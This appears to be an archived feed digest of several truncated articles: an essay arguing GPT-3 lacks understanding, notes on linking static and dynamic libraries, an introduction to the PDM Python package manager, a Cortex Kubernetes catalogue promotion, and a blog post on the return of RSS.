<p>The neglect of this question leaves uncertain the place for thought in a future where <em>unthinking intelligence</em> is no longer an oxymoron, but soon to be a ubiquitous mode of machine presence, one that will be embodied in the descendants and cousins of GPT-3. There is an urgent question haunting us, an echo from Alfred North Whitehead’s conclusion in 1911 that civilizations advance by expanding our capacity for <em>not</em> thinking: What thoughts do the civilized keep?</p>



<p>Whitehead, of course, was explicitly talking about the operations of mathematics and the novel techniques that enable ever more advanced shortcuts to be taken in solving mathematical problems. To suggest that he is simply wrong, that all operations of thought must be forever retained in our cognitive labors, is to ignore the way in which shedding elementary burdens of thought often enables us to take up new and more sophisticated ones. As someone who lived through the late 20<sup>th</sup> century moral panic over students using handheld scientific calculators in schools, I embrace rather than deny the vital role that unthinking machines have historically played in enabling humans to stretch the limits of our native cognitive capacities.</p>



<p>Yet Whitehead’s observation leaves us to ask: What purpose, then, does thinking hold for us other than to be continually surpassed by mindless technique and left behind? What happens when our unthinking machines can carry out even those scientific operations of thought that mathematical tables, scientific calculators and early supercomputers previously freed us to pursue, such as novel hypothesis generation and testing? What happens when the achievements of unthinking machines move outward from the scientific and manufacturing realms, as they already have, to bring mindless intelligence further into the heart of social policymaking, political discourse and cultural and artistic production? In which domains of human existence will <em>thinking</em> — slow, fallible, fraught with tension, uncertainty and inconsistency — still hold its place? And why should we want it to?</p>



<h5><strong>The Labor Of Understanding</strong></h5>



<p>To answer these questions, we need to focus on what unthinking intelligence lacks. What is missing from GPT-3?</p>



<p>It’s more than just sentience, the ability to feel and experience joy or suffering. And it’s more than conscious self-awareness, the ability to monitor and report upon one’s own cognitive and embodied states. It’s more than free will, too — the ability to direct or alter those states without external compulsion.</p>



<p>Of course, GPT-3 lacks all of these capacities that we associate with minds. But there is a further capacity it lacks, one that may hold the answer to the question we are asking. GPT-3 lacks <em>understanding</em>.</p>



<p>This is a matter of some debate among artificial intelligence researchers. Some define understanding simply as behavioral problem-solving competence in a particular environment. But this is to mistake the effect for the cause, to reduce understanding to just one of the practical powers that flows from it.</p>



<p>For AI researchers to move past the behaviorist conflation of thought and action, the field needs to drink again from the philosophical waters that fed much AI research in the late 20<sup>th</sup> century, when the field was theoretically rich, albeit technically floundering. Hubert Dreyfus’s 1972 ruminations in “What Computers Can’t Do”(and 20 years later, in “What Computers Still Can’t Do”) still offer many soft targets for legitimate criticism, but his and other work of the era at least took AI’s hard problems seriously. Dreyfus in particular understood that AI’s true hurdle is not performance but <em>understanding</em>.</p>



<p>Understanding is beyond GPT-3’s reach because understanding cannot occur in an isolated computation or behavior, no matter how clever. Understanding is not an act but a <em>labor</em>. Labor is entirely irrelevant to a computational model that has no history or trajectory in the world. GPT-3 endlessly simulates meaning anew from a pool of data untethered to its previous efforts. This is the very power that enables GPT-3’s versatility; each task is a self-contained leap, like someone who reaches the flanks of Mt. Everest by being flung there by a catapult.</p>

  </div>
</div>




<p>GPT-3 cannot think, and because of this, it cannot understand. Nothing under its hood is built to do it. The gap is not in silicon or rare metals, but in the nature of its activity.</p>



<p>Understanding does more than allow an intelligent agent to skillfully surf, from moment to moment, the associative connections that hold a world of physical, social and moral meaning together. Understanding tells the agent how to weld <em>new</em> connections that will hold under the weight of the intentions, values and social goals behind our behavior.</p>



<p>Predictive and generative models like GPT-3 cannot accomplish this. GPT-3 doesn’t even know that to successfully answer the question “Can AI be conscious?,” as the philosopher <a href="https://twitter.com/raphamilliere/status/1287383891607683078?s=21" data-wpel-link="external" target="_blank" rel="external noopener noreferrer">Raphaël Millière</a> prompted it to do in an essay, it can’t randomly reverse its position every few sentences.</p>



<p>GPT-3 effortlessly completed the essay assigned by Millière. This is a sign not of GPT-3’s understanding, but the <em>absence </em>of it. To write it, it did not need to think; it did not need to struggle to weld together, piece by piece, a singular position that would hold steady under the pressure of its other ideas and experiences, or questions from other members of its lived world.</p>



<p>The instantaneous improvisation of its essay wasn’t anchored to a <em>world</em> at all; instead, it was anchored to a data-driven abstraction of an isolated behavior-type, one that could be synthesized from a corpus of training data that includes millions of human essays, many of which happen to mention consciousness. GPT-3 generated an instant variation on those patterns and, by doing so, imitated the behavior-type “writing an essay about AI consciousness.”</p>



<p>But it did not need to know anything about what an essay on AI consciousness might seek to do, or how it would fit into the larger world of social meaning that makes the subject of AI consciousness worth seeking to understand. It is akin to the difference between a songbird’s tuneful mimicry of a human lullaby and a new human father’s variation — however tuneless — on the lullaby his mother once sang to him as a child. One act is anchored in an understanding of the shared social history of meaning that gives a lullaby significance. The other is not.</p>



<p>Understanding is a lifelong labor. It is also one carried out not by isolated individuals but by social beings who perform this cultural labor together and share its fruits. The labor of understanding is a …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Every few months I end up in the a shady corner of the internet, with twenty tabs open searching for variations on <em>‘why the $%^&amp;!@ does this not work’</em>. Hours later I end up re-discovering the truth: using binary libraries in <code>$CURRENT_YEAR</code> still pretty much sucks.</p><p>So let’s try and get something positive out of this, and at least write up the facts of the situation. Here’s to hoping someone comes along and shows me I missed that “one weird trick” that will make all of this make sense.</p><p>So here we are, in no particular order, a bunch of hard-learned facts about using libraries (on unix-flavored operating systems)</p><div>
<li>
<p><em>Dynamic</em> or <em>shared</em> libraries are loaded up by your program at runtime. They contain lookup tables that map symbols to shared executable code. If you give someone a binary that links a dynamic library that they don’t already have, the OS will complain about missing libraries when they try to run it.</p>
</li>
<li>
<p>Dynamic or “shared” libraries have names that start with <code>lib</code> and finish with <code>.so</code>. Unless you’re on a Mac, where they end with <code>.dylib</code>.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p>
</li>
<li>
<p>Dynamic libraries themselves can link other dynamic libraries. These are known as <em>transitive dependencies</em>. All dependencies will need to be found to successfully run your binary.</p>
</li>
<li>
<p>If you want to move a binary from one machine (where it was compiled) to another, you’ll almost certainly find that at least some of the shared libraries needed by your binary are no longer found. This is usually the first sign of trouble…</p>
</li>
<li>
<p>Linux knows how to find libraries because it has a list of known locations for shared libraries in <code>/etc/ld.so.conf</code>. Each time you run <code>ldconfig</code>, the OS updates its cache of known libraries by going through directories in this file and reading the libraries it finds. OS X works differently… see <a href="https://www.unix.com/man-page/osx/1/dyld/">dyld</a> and friends.</p>
</li>
<li>
<p>Use <code>ldd</code> (linux) or <code>otool -L</code> (OS X) to query your binary for the missing libraries. Beware that it is <a href="http://man7.org/linux/man-pages/man1/ldd.1.html">not safe</a> to do this on a binary you suspect may be malicious 😞.</p>
</li>
<li>
<p>You can safely copy dynamic libraries from one machine to another. As long as the environments are similar enough…<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> . In a perfect world (on linux), you could just copy the library you want to use into <code>/usr/local/lib</code> (the recommended place for unstable libraries) and then run <code>ldconfig</code> to make your OS reload its library cache.</p>
</li>
<li>
<p>Of course, on OS X things work totally differently. Dynamic libraries have an <em>install name</em> which contains the absolute path. This path is baked into your binary at compile time. You can use <a href="https://www.unix.com/man-page/osx/1/install_name_tool/">install_name_tool</a> to change it. Good luck!</p>
</li>
<li>
<p>On linux, Adding libraries to <code>/usr/local/lib</code> makes them visible to everything, so you may want to copy your library somewhere else so that only <em>your</em> binary knows how to find it. One way to do this is using <em>rpath</em>…</p>
</li>
<li>
<p>You can set the <em>rpath</em> attribute of your binary to contain a directory hint for your OS to look in for libraries. This hint can be <em>relative</em> to your binary. This is especially useful if you always ship libraries in a relative directory to your binary. You can use <code>@origin</code> as a placeholder for the path of the binary itself, so an rpath of <code>@origin/lib</code> causes the OS to always look in <code>&lt;path to your binary&gt;/lib</code> for shared libraries at runtime. This can be used on both OS X and linux, and is one of the most useful tools to actually getting things working in practice.</p>
</li>
<li>
<p>If your OS isn’t finding a dynamic library that you <em>know</em> exists, you can try helping your OS by setting the environment variable <code>LD_LIBRARY_PATH</code> to the directory containing it - your OS will look there first before default system paths. Beware, this is considered <a href="http://xahlee.info/UnixResource_dir/_/ldpath.html">bad practice</a>, but it might unblock you at a pinch. OS X has <code>DYLD_LIBRARY_PATH</code>, which is similar, and also <code>DYLD_FALLBACK_LIBRARY_PATH</code>, which is similar, but different (sorry).</p>
</li>
<li>
<p>Dynamic libraries also have a thing called a <em>soname</em>, which is the name of the library, plus version information. You have seen this if you’ve seen <code>libfoo.so.3.1</code> or similar. This allows us to use different versions of the same library on the same OS, and to make non backwards-compatible changes to libraries. The soname is also baked into the library itself.</p>
</li>
<li>
<p>Often, your OS will have multiple symlinks to a single library in the same directory, just with different paths containing version information, e.g. <code>libfoo.so.3</code>, <code>libfoo.so.3.1</code>. This is to allow programs to find compatible libraries with slightly different versions. Everything starts to get rather messy here… if you really need to get into the weeds, <a href="http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html">this article</a> will help. You probably only need to understand this if you are distributing libraries to users and need to support compatibility across versions.</p>
</li>
<li>
<p>Of course, even if your binary only depends on a single symbol in a dynamic library, it must still link that library. Now consider that the dependency itself may also link other unused transitive dependencies. Accidentally “catching a dependency” can cause your list of shared library dependencies to grow out of control, so that your simple <code>hello world</code> binary ends up depending on hundreds of megabytes of totally unused shared libraries 😞.</p>
</li>
<li>
<p>One solution to avoiding “dependency explosions” is to statically link symbols directly into your binary, so let’s start to look at <em>static linking</em>!</p>
</li>
<li>
<p><em>Static</em> libraries (<code>.a</code> files) contain symbol lookup table, similarly to dynamic libraries.
However, they are much more dumb and also a total PITA to use correctly.</p>
</li>
<li>
<p>If you compile your binary and link in only static dependencies, you will end up with a <em>static binary</em>. This binary will not need to load any dependencies at runtime and thus much easier to share with others!</p>
</li>
<li>
<p><em>People On The Internet</em> will recommend that you do not not distribute static binaries, because it makes it hard to patch security flaws. With dynamic libraries, you just have to patch a single library e.g. <code>libssl.so</code>, instead of re-compiling everything on your machine that may have linked the broken library without your knowledge (i.e. everything).</p>
</li>
<li>
<p>People who build production systems at companies recommend static libraries because it’s wayyyy the hell easier to just deploy a single binary with zero dependencies that can basically run anywhere. No one cares about how big binaries are these days anyway.</p>
</li>
<li>
<p>Still more people on the internet remind you that only one copy of a dynamic library is loaded into memory by the OS even when it is used by multiple processes, saving on memory pressure.</p>
</li>
<li>
<p>The static library people remind you that modern computers have plenty of memory and library size is hardly the thing killing us right now.</p>
</li>
<li>
<p>The OS X people point out that OS X <a href="https://developer.apple.com/library/archive/qa/qa1118/_index.html">strongly discourages</a> the use of statically linked binaries.</p>
</li>
<li>
<p>Static libraries can’t declare any kinds of library dependencies. This means it is <em>your</em> responsibility to ensure all symbols are all baked correctly into your binary at link time - otherwise your linker will fail. This can make linking static libraries painfully error-prone.</p>
</li>
<li>
<p>If you get <em>symbol not found</em> errors but literally swear that you linked every damn thing, you probably linked a static library, and forgot a transitive dependency that is needed by it. This pretty much sucks as it’s basically impossible to figure out where that library comes from. Try having a guess by looking at the error messages. Or something?</p>
</li>
<li>
<p>Oh, and you must ensure that you link your static libraries in the <a href="https://stackoverflow.com/questions/45135/why-does-the-order-in-which-libraries-are-linked-sometimes-cause-errors-in-gcc">correct order</a>, otherwise you can still get <code>symbol not found errors</code>.</p>
</li>
<li>
<p>If you are starting to think it might be hard to keep track of static libraries, you are following along correctly. There are tools that can help you here, such as <code>pkgconfig</code>, <code>CMake</code>, <code>autotools</code>… or <code>bazel</code>. It’s quite easy to get going, and achieve deterministic platform-independent static builds with no dynamic dependencies… Said no one ever 😓.</p>
</li>
<li>
<p>One classic way to screw up, is to compile a static library without using the <code>-fPIC</code> flag (for “position independent code”). If you do not do this, you will be able to use the static library in a binary, but you will not be able to link it into a dynamic library. This is especially frustrating if you were provided with a static library that was compiled without this flag and you can’t easily recompile it.</p>
</li>
<li>
<p>Beware that <code>-fpic</code> is <a href="https://stackoverflow.com/questions/3544035/what-is-the-difference-between-fpic-and-fpic-gcc-parameters">not the same</a> as <code>-fPIC</code>. Apparently, <code>-fPIC</code> always works but may result in a few nanoseconds of slowdown, or something. Probably you should use <code>-fPIC</code> and try not to think about it too much.</p>
</li>
<li>
<p>Your compiler toolchain (e.g. <code>CMake</code>) usually has a one-liner way to link a bunch of static libraries into a single dynamic library with no dependencies of its own. However, should you want to link a bunch of static libraries into another static library… well I’ve never successfully found a reliable way to do this 😞. Why do this you may ask? Mostly for cffi - when I want to build a single static library from C++ and then link it into e.g. a go binary.</p>
</li>
<li>
<p>Beware that your compiler/linker is not smart! Just because the header files declare a function and your linker manages to find symbols for it in your library, doesn’t mean that the function is remotely the same. <a href="https://github.com/libspatialindex/libspatialindex/issues/93">You will discover this when you get undefined behavior at runtime.</a></p>
</li>
<li>
<p>Oh, and if the library you are linking was compiled with a <code>#define</code> switch set, but when you include the library’s headers, you do not set the define to the same value, welcome again to runtime <a href="https://github.com/openMVG/openMVG/issues/1474">undefined behavior land</a>! This is the same problem as the one above, where the symbols end up being incompatible.</p>
</li>
<li>
<p>If you are trying to ship C++, another thing that can bite you is that the C++ standard library uses dynamic linking. This means that even the most basic <code>hello world</code> program cannot be distributed to others unless they have a compatible version of <code>libstdc++</code>. Very often you’ll end up compiling with a shiny new version of this library, only to find that your target is using an older, incompatible version.</p>
</li>
<li>
<p>One way to get around <code>libstdc++</code> problems is to statically link it into your binary. However, if you create a static library that statically links <code>libstdc++</code>, and your library uses C++ …</p></li></div></div>

February 3, 2021 | https://frostming.com/2021/01-22/introducing-pdm/ | <a href="https://web.archive.org/web/*/https://frostming.com/2021/01-22/introducing-pdm/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>When you develop a Python project, you need to install the project's dependencies. For a long time, tutorials and articles have told you to use a virtual environment to isolate the project's dependencies. This way you don't contaminate the working set of other projects, or the global interpreter, to avoid possible version conflicts. We usually have to do these things:</p>
<div data-language="bash"><pre><code>$ python3 -m venv venv  
$ <span>.</span> venv/bin/activate   
<span>(</span>venv<span>)</span> $ pip <span>install</span> -r requirements.txt  </code></pre></div>
<p>There are also workflow tools that simplify this process, such as <a href="https://pipenv.pypa.io/">Pipenv</a> and <a href="https://python-poetry.org/">Poetry</a>. They create virtual environments for you without perception and then install dependencies into them. They are used by a wide range of users. A virtual environment contains a Python interpreter and has the same directory structure as a normal installation so that it can be used as if it were a standalone Python installation.</p>
<h2 id="the-problems-with-virtual-environments"><a href="#the-problems-with-virtual-environments" aria-label="the problems with virtual environments permalink"></a>The problems with virtual environments</h2>
<p>Virtualenvs help us isolate project dependencies, but things get tricky when it comes to nested venvs: One installs the virtualenv manager(like Pipenv or Poetry) using a venv encapsulated Python, and creates more venvs using the tool which is based on an encapsulated Python. One day a minor release of Python is out and one has to check all those venvs and upgrade them if required before they can safely delete the out-dated Python version.</p>
<p>Another scenario is global tools. There are many tools that are not tied to any specific virtualenv and are supposed to work with each of them. Examples are profiling tools and third-party REPLs. We also wish them to be installed in their own isolated environments. It's impossible to make them work with virtualenv, even if you have activated the virtualenv of the target project you want to work on because the tool is lying in its own virtualenv and it can only see the libraries installed in it. So we have to install the tool for each project.</p>
<p>I've been maintaining the Pipenv project as a collaborator for the past two years and became a member of PyPA in early 2020. I am always thinking if the virtual environment is really a must-to-have for Python projects, just like <code>npm</code>, it doesn't need a cloned <code>node</code> binary, but just a <code>node_modules</code> directory that is unique for each project.</p>
<h2 id="pep-582----python-local-packages-directory"><a href="#pep-582----python-local-packages-directory" aria-label="pep 582    python local packages directory permalink"></a>PEP 582 -- Python local packages directory</h2>
<p>The solution has been existing for a long time. <a href="https://www.python.org/dev/peps/pep-0582/">PEP 582</a> was originated in 2018 and is still a draft proposal till the time I wrote this article, but I found out it is exactly what <code>node_modules</code> are in Python.</p>
<p>Say you have a project with the following structure:</p>
<div data-language="text"><pre><code>.
├── __pypackages__
│   └── 3.8
│       └── lib
└── my_script.py</code></pre></div>
<p>As specified in the PEP 582, if you run <code>python3.8 /path/to/my_script.py</code>, <code>__pypackages__/3.8/lib</code> will be added to <code>sys.path</code>, and the libraries inside will become import-able in <code>my_script.py</code>.</p>
<p>Now let's review the two problems I mentioned in the last section and see how they change with the power of PEP 582. For the first problem, the main cause is that the virtual environment is bound to a cloned Python interpreter on which the subsequent library searching based. It takes advantage of Python's existing mechanisms without any other complex changes but makes the entire virtual environment to become unavailable when the Python interpreter is stale. With the local packages directory, you don't have a Python interpreter any more, the library path is directly appended to <code>sys.path</code>, so you can freely move and copy it.</p>
<p>For the second, once again, you just call the tool against the project you want to analyze, and the <code>__pypackages__</code> sitting inside the project will be loaded automatically. This way you only need to keep one copy of the global tool and make it work with multiple projects.</p>

<p>Starting from the PEP, I made <a href="https://pdm.fming.dev/">PDM</a>, a new Python package manager and workflow tool that leverages PEP 582 to get rid of virtualenv entirely. It installs dependencies into the local package directory <code>__package__</code> and makes Python interpreters aware of it with <a href="https://pdm.fming.dev/#enable-pep-582-globally">a very simple setup</a>. It is not only an implementation of PEP 582 but also the only package manager that supports <a href="https://www.python.org/dev/peps/pep-0621/">PEP 621</a>, a new metadata format based on <code>pyproject.toml</code> which becomes the standard recently. It is foreseen that pip will also gradually support this format. Besides, PDM uses the same dependency resolver as pip and has a full-featured plugin system, allowing for community-contributed plugins to enhance the functionalities.</p>
<p>In PDM, PEP 582 is not mandatory, you can also stick with virtualenv. PDM can detect <strong>existing</strong> venvs but not create new ones.</p>
<p>Another thing that is noteworthy is its dependency resolution mechanism -- it tries to lock versions that are compatible with the <code>requires-python</code> value of the project. Say your project requires Python 2.7 or 3.6 upper and you want to add <code>pytest</code> as a development dependency, in Pipenv(ver. <code>2020.11.15</code>) you have to pin <code>pytest = "&lt;5"</code> manually in <code>Pipfile</code>. And in Poetry(ver. <code>1.1.4</code>) if you run <code>poetry add -D pytest</code> you will get:</p>
<div data-language="bash"><pre><code>The current project's Python requirement <span>(</span><span>&gt;</span><span>=</span><span>2.7</span>,<span>&lt;</span><span>3.0</span> <span>||</span> <span>&gt;</span><span>=</span><span>3.6</span>,<span>&lt;</span><span>4.0</span><span>)</span> is not compatible with some of the required packages Python requirement:
    - pytest requires Python <span>&gt;</span><span>=</span><span>3.6</span>, so it will not be satisfied <span>for</span> Python <span>&gt;</span><span>=</span><span>2.7</span>,<span>&lt;</span><span>3.0</span></code></pre></div>
<p>Yes, it tells you to upgrade your Python requires version. However, in PDM, you can lock successfully:</p>
<div data-language="bash"><pre><code>❯ pdm <span>add</span> -d pytest
Adding packages to dev dependencies: pytest
✔ 🔒 Lock successful
Changes are written to pdm.lock.
Changes are written to pyproject.toml.

  ✔ Install six <span>1.15</span>.0 successful
  ✔ Install wcwidth <span>0.2</span>.5 successful

🎉 All complete<span>!</span></code></pre></div>
<p>As you can see, <code>pytest</code> is pinned to <code>4.*</code> that is compatible with Python 2.7 and Python 3.6+.</p>
<p>For more features and demos, please refer to the <a href="https://pdm.fming.dev/">PDM's website</a> and <a href="https://github.com/frostming/pdm">GitHub repo</a>.</p>
<h2 id="some-random-words"><a href="#some-random-words" aria-label="some random words permalink"></a>Some random words</h2>
<p>You may have seen this <a href="https://xkcd.com/927/">comic</a> before, there are already so many package managers in Python's world, do we need a new one? No, I think. Gladly we have seen many improvements in the Python packaging ecosystem and the official installer pip, such as <a href="https://www.python.org/dev/peps/pep-0517/">PEP 517</a>/<a href="https://www.python.org/dev/peps/pep-0518/">PEP 518</a>, and the <a href="https://discuss.python.org/t/announcement-pip-20-2-release/4863">new dependency resolver</a>, more to come in the future. But before the day comes, why not try something different from the traditional, why not make something new that makes at least myself happy. If you think so, PDM should be an option, hopefully.</p></div></div>]]>

You can augment each k8s service with critical pieces of context like ownership (linked to your identity provider), documentation, on-call info, latency graphs, and more.</p><figure id="w-node-462784fda960-f078b551"><p><img src="https://assets.website-files.com/5ec5ad145468d2d2ff78b364/601b30f41fbfce2f0104b295_Screen_Shot_2021-02-01_at_12.55.09_PM.png" loading="lazy" alt=""></p></figure><p>While this may seem like a problem only applicable to large companies with those 500 services, it's never too soon to start cataloging and organizing your services. If your company has recently adopted or is considering adopting Kubernetes, chances are you're either already experiencing rapid growth of services and engineering or you anticipate it coming soon.</p><p>With Cortex, you can easily start mapping your Kubernetes services. Cortex grows with you as your cluster grows, making sure new services play well with the old ones and old ones don't get lost along the way. Your existing services get automatically mapped to the Kubernetes deployments, so getting started is extremely simple!</p><figure><p><img src="https://assets.website-files.com/5ec5ad145468d2d2ff78b364/601b311a63ba4e69a5b356bd_Screen_Shot_2020-12-14_at_4.04.14_PM.png" loading="lazy" alt=""></p></figure><p>So what happens if all your services have already gotten lost along the way and you already have those 500 services? If you have an established cluster and many services, the new Cortex Kubernetes integration helps you un-clutter in the click of a button.</p><p>Cortex automatically detects all your Kubernetes deployments and allows you to easily import all of them in a single click. You can quickly see your services, map them to owners, and start making sense of the clutter. The best part is, as your cluster inevitably grows even more, Cortex will continue to detect all your new Kubernetes services and map them automatically.</p><p>In addition to easily importing all your Kubernetes services to Cortex, you'll also soon be able to see important Kubernetes information for each service such as replica count, restarts, status, etc. directly from your catalog. Want to also see which k8s services are not conforming to standards on your team? You can use scorecards to score and monitor each service in your cluster for deployment health and readiness.</p><figure><p><img src="https://assets.website-files.com/5ec5ad145468d2d2ff78b364/601b3138bb1299f5719162ee_Screen_Shot_2021-02-01_at_1.19.02_PM.png" loading="lazy" alt=""></p><figcaption>Each k8s service can be graded on rules you define in a scorecard</figcaption></figure><p>Sign up for a demo <a href="https://www.getcortexapp.com/" target="_blank">here</a> and we'll send you a helm chart to try it out in your own cluster!</p></div></div>]]>

February 3, 2021 | https://wilw.dev/blog/2021/02/03/rss-rise-fall-rise/ | <a href="https://web.archive.org/web/*/https://wilw.dev/blog/2021/02/03/rss-rise-fall-rise/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>Many people would consider RSS - Really Simple Syndication - to be a relic of the past. However I think it has been making a comeback.</p>
<p>RSS is a mechanism by which people can automatically receive updates from individual websites, similar to how you might follow another user on a social networking service. Software known as RSS <em>readers</em> can be used to subscribe to RSS <em>feeds</em> in order to receive these updates. As new content (e.g. a blog post) is published to an RSS-enabled website, its feed is updated and your RSS reader will show the new post the next time it refreshes. Many RSS readers have an interface similar to an email client, with read/unread states, folders, favourites, and more.</p>
<h2>The rise</h2>
<p>RSS was <a href="https://en.wikipedia.org/wiki/RSS">first released</a> in early 1999, and it steadily gained popularity amongst content producers and consumers, with adopters from media outlets and software implementations making their way into early Internet Eplorer and Firefox versions, amongst others. These were the days before the "real" <a href="https://en.wikipedia.org/wiki/Web_2.0">Web 2.0</a> hit, and in which websites were very much more silos of information. Tools like RSS were powerful then because they enabled the easy <em>aggregation</em> of information from multiple sources.</p>
<p>Not too long after this (Web 2.0 'began' in the mid 2000's), and during the years ever since, mainstream social networks became ubiquitous. Many people flock(ed) to these as a way to share and subscribe (by following others) to receive updates in real time, several times a day and from lots of different people and organisations. These services enabled features far beyond aggregation by allowing easy sharing, rating (e.g. likes) and commentating such that today such services have become the primary means of information and news sharing and reception for many people.</p>
<h2>The fall(?)</h2>
<p>At that time RSS was still very much "a thing" for many people (though the <a href="https://en.wikipedia.org/wiki/Google_Reader#Discontinuation">discontinuation of the hugely popular Google Reader in 2013</a> was a bit of a bummer to these communities). However new people now joining the web scene would be far more likely to instead engage with these extremely well-funded, well-marketed, and <em>centralised</em> social platforms - <a href="https://www.thesocialdilemma.com/">perfectly engeineered to be addictive</a>, entirely driven and propagated by <a href="https://en.wikipedia.org/wiki/Fear_of_missing_out">FOMO</a>, and focused on content-sharing (even if the content is often <a href="https://www.theguardian.com/technology/2021/jan/30/facebook-letting-fake-news-spreaders-profit-investigators-claim">misinformation</a>) - where <em>you</em> are the product, rather than spend the time researching and subscribing to individual RSS feeds.</p>
<p>To some commentators in this space the concept behind all of these social platforms is known as the <em><a href="https://jackcheng.com/essays/the-slow-web/#the-fast-web">fast web</a></em> - a web that tells you when and what information to consume rather than letting you make that decision for yourself. Facebook, Twitter, Instagram, and others all started as just a <em>chronological</em> timeline of interesting content from friends and family. On all of these services today the "algorithm" determines what (and who) goes in your timeline, and it constantly learns what to feed you - and when - in order to get those few extra minutes from you each day. This is literally its business model.</p>
<p>What used to be an innocent bookmarking tool, Twitter's "favouriting" mechanism is now essentially a game of <strong>retweet roulette</strong> in which the algorithm will every now and again choose to include your "bookmarks" (not just retweets) on the feeds of people who follow you. If that's not anxiety-inducing or user-hostile then I don't know what is!</p>
<p>Of course this is something Facebook has done for a while too, except perhaps in a more sinister way - such as implying <a href="https://www.baekdal.com/thoughts/facebook-graph-search-privacy-woes">a user has liked something when they haven't at all</a>.</p>
<p>Other social networking tools can be more user-friendly. For example, the open-source <a href="https://en.wikipedia.org/wiki/Mastodon_(software)">Mastodon</a> software powers distributed social networks that aren't fuelled by addiction and instead give you more control over what you receive and where your posts go. However these tools still have some way to go to becoming anywere near mainstream.</p>
<p>I want to caveat some of the above: I obviously don't think any of this is the fault of the individual. These social platforms are fantastically easy places to set-up a web presence. Creating an Instagram, Facebook, or Tik-Tok account for you (or your business) takes literal seconds. Within a minute you can have your profile setup and be following a dozen people, and already getting engagement and "reactions" from others (remember those "Your friend, X, is now on Instagram!" type notifications?).</p>
<p>With all of this power and efficiency at the fingertips it's no wonder that people don't create their own personal websites anymore, or feel the need to reach out to actively keep-up with other such sites. What's the point in re-inventing the wheel when I can easily create a Facebook page for myself that includes an inbuilt blog "feed", a space for links, photos, and more? And it's "free"! The barrier to creating a self-owned personal space on the internet for yourself is considered too high for most people, and is probably still seen as "geeky" even if it does come with all the benefits of privacy and control.</p>
<p>And I'm not saying that self-owned spaces, RSS, and that whole ecosystem are related, or the opposite to, mainstream social media; more that it is a useful way to compare and contrast different ways of accessing and disseminating information and the level of control one has over this.</p>
<p>This probably feels like I'm going way off-piste, and I sort of have, but my key meaning here is that for several years the concept of RSS has evaporated from popular knowledge because people haven't <em>needed</em> it - either as a tool for receiving <em>or</em> disseminating information. Ask your non-tech friends and family if they've heard of RSS (and know what it is for a bonus point) - I bet the positive response rate will be low in most cases, especially in younger respondents.</p>
<p>Also, I don't think this is solely the fault of the social giants. Online media outlets - which would have needed to rely on RSS for years before online social media became more mainstream - now often completely ignore it or treat it as a second-class citizen.</p>
<p>The <a href="https://www.bbc.co.uk/news">BBC News website</a> happily displays large friendly icons for Facebook, Twitter, and the like, but no mention of RSS (try <code>ctrl-F</code>). In fact, you'll probably need to search the web for "bbc rss" in order to find the RSS feeds that are <a href="https://www.bbc.co.uk/news/10628494">listed on a page that hasn't been updated for over a decade</a> and which still lists IE7 and the long-discontinued Google Reader as sensible options (though ironically I suppose this does indicate the stability and robustness of the RSS system).</p>
<h2>The rise again</h2>
<p>Anyway, all that sounds a bit doom and gloom but I definitely think we are starting to see a shift in people's attitude towards and - importantly, trust in - these big tech companies. Facebook's recent attitiude towards information collection (and subsequent sharing) has <a href="https://www.independent.co.uk/life-style/gadgets-and-tech/facebook-update-apple-privacy-ads-b1795916.html">hit mainstream headlines</a> and everyone must have seen <a href="https://www.techradar.com/news/whatsapps-new-privacy-policy-requires-you-to-share-data-with-facebook">Whatsapp's popup about data sharing</a>. Too much uncertainty undermines the trust in these platforms, and people have understandably sought out other options. A few weeks ago Telegram reported an addition of <a href="https://www.androidpolice.com/2021/01/12/telegram-adds-25-million-new-users-in-just-72-hours-as-rival-apps-falter">25 million new users within 72 hours</a> as a result of these policy "changes".</p>
<p>My parents aren't really tech-aware at all but even they were telling me last week on a video call about this "new app Signal" they had downloaded and begun to use with their friends - without any of my input.</p>
<p>I'm not sure what it is, but people seem to <em>care</em> more about their data these days. Whether that's because of GDPR, the fact that coronavirus means people aren't endlessly scrolling through social feeds on their daily commutes anymore, or something else or a mixture of everything. And that extends to being more picky about the information they receive too.</p>
<p>Either way, I've noticed more and more <a href="https://atthis.link/blog/2021/rss.html">posts like this</a> (and the subsequent <a href="https://news.ycombinator.com/item?id=26014344">reactions and discussions</a>) recently, and the <a href="https://100daystooffload.com/">#100DaysToOffload</a> movement has brought about a surge in people - myself included, really - creating their own longer-form content, for which RSS is a perfect distribution mechanism.</p>
<p>I think we're on a bit of a brink representing a general - but real - change in attitude from people towards data, and the time that they choose to give to now lesser-trusted platforms. It is our responsibility to help educate about the alternative options so that those around us can make their own decisions. Whilst I am relatively new to RSS in the grand scheme of things (having only really started properly engaging with it about a year ago), it already makes me feel more in control of what I view, and when.</p>
<p>Whilst this concept doesn't need to be limited to RSS, it's a great starting point as it's easy to understand. It "feels" friendly, it helps power connections to the decentralised and <a href="https://ar.al/2020/08/07/what-is-the-small-web/">small web</a>.</p>
<p>It, as a concept, has no business model. Though of course you can pay for the software you use, and websites can make money through ads, but at least you have a <em>choice</em> regarding who you subscribe to and the software you use to do it through (and <a href="https://en.wikipedia.org/wiki/Comparison_of_feed_aggregators">there are lots of choices</a>). You aren't tied into anything and it respects your privacy - you don't need to "sign-up", provide your details, and sites don't know that <em>you</em> personally have subscribed.</p>
<p>RSS may be age-old, but it is an excellent way to still get the information you need as you begin to use mainstream social media less, and - although it doesn't need to be slow in itself - it is a fantastic tool to combine with the growing and user-respecting world of the <a href="https://jackcheng.com/essays/the-slow-web#timely-vs-real-time">slow web</a>, in which timeliness (where you're in control) is far more important than "real-time".</p>
<p>--</p>
<h3>Edit</h3>
<p>I've received some replies to this post that talk about the lack of mentions of the <a href="https://en.wikipedia.org/wiki/Atom_(Web_standard)">Atom standard</a> and podcasts. RSS certainly is (and has been) a fantastic way to subscribe to podcasts. Its flexibility and ease of use has been a great tool for both content creators and consumers, and has helped to build the ecosystem of podcast apps and services we see today. And of course, there are other very useful distribution mechanisms and standards available for distributing information, such as Atom. This post was …</p></div></article></div>

